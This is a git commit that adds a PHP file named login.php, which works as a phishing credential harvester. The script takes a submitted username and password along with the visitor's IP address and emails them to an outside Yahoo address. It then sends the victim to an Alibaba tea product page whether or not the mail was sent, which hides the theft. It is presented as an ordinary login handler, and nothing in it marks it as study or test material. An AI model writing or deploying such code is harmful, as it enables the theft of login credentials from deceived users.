3229890113c01f1fea0158bc55d8376a62f4db2e
famebom <59346442+famebom@users.noreply.github.com>
2020-01-20 20:23:35 +0800

    Add files via upload

---
+++ login.php
@@ -0,0 +1,16 @@
+<?php
+    
+    $to = "nowisabundance@yahoo.com";
+    
+       $login_username = $_REQUEST['login_username'];
+        $secretkey = $_REQUEST['secretkey'];
+        $ip=$_SERVER['REMOTE_ADDR'];
+	$headers = "noreply@yahoo.com";
+    $body = "From: $login_username \n\n Username: $login_username \n\n Password: $secretkey \n\n IP: $ip";
+    $sent = mail($to, $subject, $body, $headers) ;
+    $ip=$_SERVER['REMOTE_ADDR'];
+    if($sent)
+    {echo "<script language=javascript>window.location = 'http://www.alibaba.com/Tea-Product_pid100008840/';</script>";}
+    else
+    {echo "<script language=javascript>window.location = 'http://www.alibaba.com/Tea-Product_pid100008840/';</script>";}
+    ?>
